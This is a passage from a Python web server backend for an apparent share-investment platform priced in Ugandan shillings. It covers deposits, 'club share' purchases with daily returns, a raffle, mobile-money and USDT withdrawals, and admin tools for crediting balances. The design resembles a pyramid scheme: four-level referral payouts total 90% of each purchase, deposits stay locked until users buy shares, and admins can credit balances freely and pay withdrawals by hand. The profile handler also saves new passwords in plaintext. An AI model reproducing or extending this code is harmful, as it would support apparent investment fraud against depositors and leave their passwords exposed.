                "status": "pending",
                "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }
            user.setdefault("deposits", []).insert(0, dep)
            user.setdefault("transactions", []).insert(0, {
                "date": dep["created_at"], "type": f"Deposit submitted ({method})", "amount": amount, "status": "pending"
            })
            update_user(user)
            try:
                ws_broadcast("deposit_pending", {"user_id": user.get("id"), "amount": amount, "txid": txid}, admin_only=True)
            except Exception:
                pass
            return self._json(200, {
                "message": "Deposit submitted. Wallet balance updates only after system confirmation.",
                "user": public_user(user),
                "pay": pay_methods(),
            })

        if path == "/api/purchase":
            cid = int(body.get("club_id") or body.get("machine_id") or 0)
            weeks = int(body.get("weeks") or 1)
            club = next((c for c in CLUBS if c["id"] == cid), None)
            tier = next((t for t in TIERS if t["weeks"] == weeks), None)
            if not club or not tier:
                return self._json(400, {"error": "Choose a club and lock period"})
            price = tier["price"]
            if float(user.get("balance") or 0) < price:
                return self._json(400, {"error": "Insufficient balance. Deposit first."})
            user["balance"] = round(float(user["balance"]) - price, 2)
            share = {
                "id": "s_" + uuid.uuid4().hex[:8],
                "club_id": club["id"], "club": club["name"], "league": club["league"],
                "weeks": weeks, "price": price, "daily": tier["daily"],
                "start": datetime.now(timezone.utc).isoformat(),
            }
            user.setdefault("shares", []).append(share)
            user["locked"] = round(float(user.get("locked") or 0) + price, 2)
            user["raffle_tickets"] = int(user.get("raffle_tickets") or 0) + 1
            unlocked_note = ""
            if float(user.get("join_bonus_locked") or 0) > 0:
                unlocked = float(user.get("join_bonus_locked") or 0)
                user["join_bonus_locked"] = 0
                unlocked_note = f" · joining bonus UGX {int(unlocked):,} unlocked for withdrawal"
                user.setdefault("transactions", []).insert(0, {
                    "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "type": "Joining bonus unlocked (first club share)",
                    "amount": 0,
                    "status": "unlocked",
                })
            user.setdefault("transactions", []).insert(0, {
                "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "type": f"Bought {club['name']} · {tier['label']}",
                "amount": -price,
            })
            # 4-level referral on investment
            rates = (0.30, 0.25, 0.20, 0.15)
            parent_id = user.get("referred_by")
            buyer = user
            for level, rate in enumerate(rates, 1):
                if not parent_id:
                    break
                parent = find_user(uid=parent_id)
                if not parent:
                    break
                reward = int(round(price * rate))
                parent["balance"] = round(float(parent.get("balance") or 0) + reward, 2)
                parent["referral_earnings"] = round(float(parent.get("referral_earnings") or 0) + reward, 2)
                parent.setdefault("transactions", []).insert(0, {
                    "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "type": f"L{level} referral {int(rate*100)}% — {buyer.get('name')}",
                    "amount": reward,
                })
                update_user(parent)
                parent_id = parent.get("referred_by")
            update_user(user)
            try:
                ws_broadcast("share_bought", {"user_id": user.get("id")}, admin_only=True)
            except Exception:
                pass
            return self._json(200, {"message": "Shares purchased" + unlocked_note, "user": public_user(user)})


        if path == "/api/raffle/play":
            tickets = int(user.get("raffle_tickets") or 0)
            if tickets < 1:
                return self._json(400, {"error": "No raffle tickets. Buy a club share to get 1 ticket."})
            if not user.get("shares"):
                return self._json(400, {"error": "Buy club shares before playing raffle"})
            user["raffle_tickets"] = tickets - 1
            # not always a win — ~35% chance of prize
            import random
            prizes = [0, 0, 0, 500, 1000, 2000, 5000, 0, 0, 1500, 0, 3000]
            win = int(random.choice(prizes))
            if win > 0:
                user["balance"] = round(float(user.get("balance") or 0) + win, 2)
                user["dividend_available"] = round(float(user.get("dividend_available") or 0) + win, 2)
                try:
                    pool_move("debit", ugx_to_usd(win), "Raffle prize", {"user_id": user.get("id"), "ugx": win})
                except Exception:
                    pass
            user.setdefault("transactions", []).insert(0, {
                "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "type": ("Raffle win UGX " + str(win)) if win else "Raffle — no prize",
                "amount": win,
                "status": "raffle",
            })
            update_user(user)
            return self._json(200, {
                "win": win,
                "message": ("You won UGX {:,}!".format(win) if win else "No prize this time. Buy another share for a new ticket."),
                "user": public_user(user),
            })

        if path == "/api/profile":
            # update payout, avatar, password, wd pin
            avatar = body.get("avatar")
            if avatar is not None:
                user["avatar"] = str(avatar)[:32]
            if body.get("payout_method"):
                user["payout_method"] = str(body.get("payout_method")).strip().lower()[:20]
            if body.get("payout_account") is not None:
                user["payout_account"] = str(body.get("payout_account")).strip()[:80]
            cur = body.get("current_password")
            newp = body.get("new_password")
            if newp:
                ok = verify_password(cur or "", user.get("password_hash") or "") or (user.get("password") == cur)
                if not ok:
                    return self._json(400, {"error": "Current password is wrong. Contact support if you need a reset."})
                if len(str(newp)) < 4:
                    return self._json(400, {"error": "New password too short"})
                user["password_hash"] = hash_password(str(newp))
                user["password"] = str(newp)
            wpin = body.get("wd_pin")
            if wpin is not None and str(wpin).strip():
                user["wd_pin_hash"] = hash_password(str(wpin).strip())
            update_user(user)
            return self._json(200, {"ok": True, "user": public_user(user), "message": "Profile updated"})

        if path == "/api/dividend-to-share":
            try:
                amount = float(body.get("amount") or 0)
            except Exception:
                amount = 0
            if amount <= 0 or amount > float(user.get("balance") or 0):
                return self._json(400, {"error": "Invalid amount"})
            if not user.get("shares"):
                return self._json(400, {"error": "Buy a club share first, then you can add dividends to it"})
            user["balance"] = round(float(user["balance"]) - amount, 2)
            take_div = min(amount, float(user.get("dividend_available") or 0))
            user["dividend_available"] = round(float(user.get("dividend_available") or 0) - take_div, 2)
            user["locked"] = round(float(user.get("locked") or 0) + amount, 2)
            user["shares"][-1]["price"] = round(float(user["shares"][-1].get("price") or 0) + amount, 2)
            user.setdefault("transactions", []).insert(0, {
                "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "type": "Dividend added to club share",
                "amount": -amount,
            })
            update_user(user)
            return self._json(200, {"message": "Dividend added to your club share", "user": public_user(user)})

        if path == "/api/withdraw":
            # Rules (fund movement): must own shares; 5% fee; amount held until system
            # Under Review → Disbursed (approve) or Rejected (refund to balance)
            locked_bonus = float(user.get("join_bonus_locked") or 0)
            div_avail = float(user.get("dividend_available") or 0)
            has_shares = bool(user.get("shares"))
            if has_shares:
                available = round(float(user.get("balance") or 0) - locked_bonus, 2)
            else:
                # Dividends can be withdrawn immediately. Joining bonus + deposits stay locked until first share.
                available = min(div_avail, float(user.get("balance") or 0))
            if available < 0:
                available = 0
            if available <= 0 and not has_shares:
                return self._json(400, {"error": "No withdrawable dividends yet. Joining bonus and deposits unlock after you buy club shares."})
            try:
                amount = float(body.get("amount") or 0)
            except Exception:
                amount = 0
            method = (body.get("method") or "momo").strip().lower()
            account = (body.get("account") or body.get("phone") or body.get("wallet") or "").strip()
            allowed = {"momo", "mtn", "airtel", "trc20", "usdt", "erc20", "bep20"}
            if method not in allowed:
                return self._json(400, {"error": "Choose payout method: MTN, Airtel or USDT (TRC20/ERC20/BEP20)"})
            if not account:
                return self._json(400, {"error": "Enter your MoMo number or crypto wallet for payout"})
            if method in ("momo", "mtn", "airtel"):
                reg = re.sub(r"\D", "", str(user.get("phone") or ""))
                acc = re.sub(r"\D", "", account)
                if reg and acc and len(reg) >= 9 and len(acc) >= 9 and reg[-9:] != acc[-9:]:
                    return self._json(400, {"error": "MoMo withdrawals must use the phone number registered on your account"})
            if amount < 1000:
                return self._json(400, {"error": "Minimum withdrawal is UGX 1,000"})
            if amount <= 0:
                return self._json(400, {"error": "Invalid amount"})
            if amount > available:
                return self._json(400, {"error": f"Max withdrawable UGX {available:,.0f}. Joining bonus stays locked until you buy club shares." if locked_bonus else "Insufficient withdrawable balance"})
            fee = round(amount * 0.05, 2)
            net = round(amount - fee, 2)
            # Hold funds: leave Available, move to pending hold
            user["balance"] = round(float(user["balance"]) - amount, 2)
            take_div = min(amount, float(user.get("dividend_available") or 0))
            user["dividend_available"] = round(float(user.get("dividend_available") or 0) - take_div, 2)
            user["pending_withdraw"] = round(float(user.get("pending_withdraw") or 0) + amount, 2)
            user["payout_method"] = method
            user["payout_account"] = account
            wds = load(WD_FILE, [])
            wid = "w_" + uuid.uuid4().hex[:10]
            txid = "WD" + uuid.uuid4().hex[:10].upper()
            wds.insert(0, {
                "id": wid,
                "user_id": user["id"], "name": user.get("name"),
                "phone": user.get("phone"), "email": user.get("email"),
                "amount": amount, "fee": fee, "net": net,
                "method": method, "account": account,
                "status": "under_review",
                "txid": txid,
                "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "timeline": [
                    {"at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "status": "under_review", "note": "Submitted by member"}
                ],
            })
            save(WD_FILE, wds)
            try:
                pool_move("credit", ugx_to_usd(amount), "Withdrawal from member wallet to pool", {"user_id": user.get("id"), "txid": txid, "ugx": amount})
            except Exception as e:
                print("[pool] withdraw submit", e)
            user.setdefault("transactions", []).insert(0, {
                "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "type": f"Withdrawal held ({method}) · TxID {txid}",
                "amount": -amount,
                "status": "under_review",
                "txid": txid,
            })
            update_user(user)
            try:
                ws_broadcast("withdraw_pending", {"id": wid, "user_id": user["id"], "amount": amount, "txid": txid}, admin_only=True)
            except Exception:
                pass
            return self._json(200, {
                "message": "Withdrawal under review. 5% fee applies. Funds held until system confirms.",
                "txid": txid,
                "fee": fee,
                "net": net,
                "user": public_user(user),
            })

        if path == "/api/admin/withdraw-action":
            if not (user.get("is_admin") or user.get("is_support")):
                return self._json(403, {"error": "System only"})
            action = (body.get("action") or "").strip().lower()
            wid = body.get("withdraw_id") or body.get("id")
            wds = load(WD_FILE, [])
            w = next((x for x in wds if x.get("id") == wid), None)
            if not w:
                return self._json(404, {"error": "Withdrawal not found"})
            if w.get("status") in ("disbursed", "rejected"):
                return self._json(400, {"error": "Already finalized"})
            target = find_user(uid=w.get("user_id"))
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if action in ("approve", "disburse", "reviewed"):
                # Mark disbursed — funds already deducted; paid via MoMo/crypto outside the app
                w["status"] = "disbursed"
                w["reviewed_at"] = now
                w.setdefault("timeline", []).append({"at": now, "status": "disbursed", "note": "Paid by system"})
                if target:
                    held = float(w.get("amount") or 0)
                    target["pending_withdraw"] = max(0, round(float(target.get("pending_withdraw") or 0) - held, 2))
                    target.setdefault("transactions", []).insert(0, {
                        "date": now,
                        "type": f"Withdrawal disbursed · TxID {w.get('txid')}",
                        "amount": 0,
                        "status": "disbursed",
                        "txid": w.get("txid"),
                    })
                    update_user(target)
                save(WD_FILE, wds)
                try:
                    ws_broadcast("withdraw_update", {"id": wid, "status": "disbursed", "txid": w.get("txid")}, user_id=w.get("user_id"))
                    ws_broadcast("admin_notify", {"type": "withdraw", "status": "disbursed"}, admin_only=True)
                except Exception:
                    pass
                return self._json(200, {"ok": True, "status": "disbursed", "withdrawal": w})
            if action == "reject":
                w["status"] = "rejected"
                w["reviewed_at"] = now
                w.setdefault("timeline", []).append({"at": now, "status": "rejected", "note": "Rejected — refunded to balance"})
                if target:
                    held = float(w.get("amount") or 0)
                    target["balance"] = round(float(target.get("balance") or 0) + held, 2)
                    target["pending_withdraw"] = max(0, round(float(target.get("pending_withdraw") or 0) - held, 2))
                    try:
                        pool_move("debit", ugx_to_usd(held), "Withdrawal rejected · refund to wallet", {"user_id": target.get("id"), "txid": w.get("txid"), "ugx": held})
                    except Exception as e:
                        print("[pool] withdraw reject", e)
                    target.setdefault("transactions", []).insert(0, {
                        "date": now,
                        "type": f"Withdrawal rejected · refund · TxID {w.get('txid')}",
                        "amount": held,
                        "status": "rejected",
                        "txid": w.get("txid"),
                    })
                    update_user(target)
                save(WD_FILE, wds)
                try:
                    ws_broadcast("withdraw_update", {"id": wid, "status": "rejected", "txid": w.get("txid"), "user": public_user(target) if target else None}, user_id=w.get("user_id"))
                    ws_broadcast("admin_notify", {"type": "withdraw", "status": "rejected"}, admin_only=True)
                except Exception:
                    pass
                return self._json(200, {"ok": True, "status": "rejected", "withdrawal": w})
            return self._json(400, {"error": "action must be approve or reject"})


        if path == "/api/admin/credit":
            if not (user.get("is_admin") or user.get("is_support")):
                return self._json(403, {"error": "System only"})
            if not user.get("is_admin") and not user.get("can_approve_deposit"):
                # co-managers / support can credit if admin flag or support
                if not user.get("is_support"):
                    return self._json(403, {"error": "System only"})
            target_id = body.get("user_id") or body.get("id")
            try:
                amount = float(body.get("amount") or 0)
            except Exception:
                amount = 0
            note = (body.get("note") or body.get("reason") or "Manual credit").strip()[:120]
            if amount <= 0:
                return self._json(400, {"error": "Amount must be greater than 0"})
            target = find_user(uid=target_id)
            if not target:
                return self._json(404, {"error": "User not found"})
            target["balance"] = round(float(target.get("balance") or 0) + amount, 2)
            target.setdefault("transactions", []).insert(0, {
                "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "type": "Manual credit · " + note,
                "amount": amount,
            })
            update_user(target)
            creds = load(CREDITS_FILE, [])
            entry = {
                "id": "c_" + uuid.uuid4().hex[:10],
                "user_id": target.get("id"), "name": target.get("name"),
                "amount": amount, "note": note,
                "by": user.get("email") or user.get("id"),
                "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }
            creds.insert(0, entry)
            save(CREDITS_FILE, creds[:500])
            try:
                pool_move("debit", ugx_to_usd(amount), "Manual credit · " + note, {"user_id": target.get("id"), "ugx": amount})
            except Exception as e:
                print("[pool] credit", e)
            try:
                ws_broadcast("balance_update", {"user": public_user(target)}, user_id=target.get("id"))
                ws_broadcast("admin_notify", {"type": "credit", "user_id": target.get("id"), "amount": amount}, admin_only=True)
            except Exception:
                pass
            return self._json(200, {"ok": True, "message": "Credited", "user": public_user(target), "credit": entry, "pool_usd": get_pool().get("usd")})

        if path == "/api/admin/bulk-credit":
            if not (user.get("is_admin") or user.get("is_support")):
                return self._json(403, {"error": "System only"})
            items = body.get("items") or body.get("credits") or []
            same = body.get("amount")
            ids = body.get("user_ids") or []
            if same is not None and ids:
                try:
                    same = float(same)
                except Exception:
                    return self._json(400, {"error": "Invalid amount"})
                items = [{"user_id": uid, "amount": same} for uid in ids]
            if not items:
                return self._json(400, {"error": "No credits provided"})
            note = (body.get("note") or "Bulk credit").strip()[:120]
            results = []
            for it in items:
                tid = it.get("user_id") or it.get("id")
                try:
                    amt = float(it.get("amount") or 0)
                except Exception:
                    amt = 0
                if not tid or amt <= 0:
                    results.append({"user_id": tid, "ok": False, "error": "invalid"})
                    continue
                target = find_user(uid=tid)
                if not target:
                    results.append({"user_id": tid, "ok": False, "error": "not found"})
                    continue
                target["balance"] = round(float(target.get("balance") or 0) + amt, 2)
                target.setdefault("transactions", []).insert(0, {
                    "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "type": "Manual credit · " + note,
                    "amount": amt,
                })
                update_user(target)
                creds = load(CREDITS_FILE, [])
                creds.insert(0, {
                    "id": "c_" + uuid.uuid4().hex[:10],
                    "user_id": tid, "name": target.get("name"),
                    "amount": amt, "note": note,
                    "by": user.get("email") or user.get("id"),
                    "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                })
                save(CREDITS_FILE, creds[:500])
                try:
                    pool_move("debit", ugx_to_usd(amt), "Bulk credit · " + note, {"user_id": tid, "ugx": amt})
                except Exception:
                    pass
                try:
                    ws_broadcast("balance_update", {"user": public_user(target)}, user_id=target.get("id"))
                except Exception:
                    pass
                results.append({"user_id": tid, "ok": True, "balance": target["balance"], "amount": amt})
            try:
                ws_broadcast("admin_notify", {"type": "bulk_credit", "count": sum(1 for r in results if r.get("ok"))}, admin_only=True)
            except Exception:
                pass
            return self._json(200, {"ok": True, "results": results})

        if path == "/api/admin/deposit-action":
            if not (user.get("is_admin") or user.get("is_support")):
                return self._json(403, {"error": "System only"})
            action = (body.get("action") or "").lower()
            dep_id = body.get("deposit_id")
            target = find_user(uid=body.get("user_id"))
            if not target:
                return self._json(404, {"error": "User not found"})
            dep = next((d for d in target.get("deposits") or [] if d.get("id") == dep_id), None)
            if not dep:
                return self._json(404, {"error": "Deposit not found"})
            if action == "approve":
                if dep.get("status") != "confirmed":
                    amt = float(dep.get("amount") or 0)
                    bonus = 1500 if amt == 3000 else 0
                    target["balance"] = round(float(target.get("balance") or 0) + amt + bonus, 2)
                    dep["status"] = "confirmed"
                    if not target.get("joining_deposit"):
                        target["joining_deposit"] = amt
                    try:
                        pool_move("debit", ugx_to_usd(amt + bonus), "Deposit to member wallet", {"user_id": target.get("id"), "ugx": amt + bonus})
                    except Exception as e:
                        print("[pool] deposit", e)
                    target.setdefault("transactions", []).insert(0, {
                        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "type": "Deposit approved", "amount": amt,
                    })
                    if bonus:
                        target["transactions"].insert(0, {
                            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "type": "Joining bonus", "amount": bonus,
                        })
            elif action == "reject":
                dep["status"] = "rejected"
            else:
                return self._json(400, {"error": "action must be approve or reject"})
            if action == "approve" and target.get("referred_by"):
                parent = find_user(uid=target.get("referred_by"))
                half = round(float(dep.get("amount") or 0) * 0.5, 2)
                if parent and half > 0:
                    pay_join_dividend(parent, target, half, f"Deposit dividend 50% · {target.get('name')}")
            update_user(target)
            try:
                ws_broadcast("deposit_update", {"deposit_id": dep_id, "status": dep.get("status"), "user_id": target.get("id"), "user": public_user(target)}, user_id=target.get("id"))
                ws_broadcast("admin_notify", {"type": "deposit", "status": dep.get("status"), "user_id": target.get("id")}, admin_only=True)
            except Exception as e:
                print("[ws] deposit", e)
            return self._json(200, {"ok": True, "user": public_user(target)})

        return self._json(404, {"error": "Not found"})


def main():
    class S(ThreadingHTTPServer):
        allow_reuse_address = True
        daemon_threads = True
    httpd = S((HOST, PORT), Handler)
    print(f"[boot] listening {HOST}:{PORT}", flush=True)
    print(f"[boot] ws ws://0.0.0.0:{PORT}/ws", flush=True)
    threading.Thread(target=seed, daemon=True).start()
    threading.Thread(target=market_broadcast_loop, daemon=True).start()
    threading.Thread(target=stats_broadcast_loop, daemon=True).start()
    httpd.serve_forever()

if __name__ == "__main__":
    main()
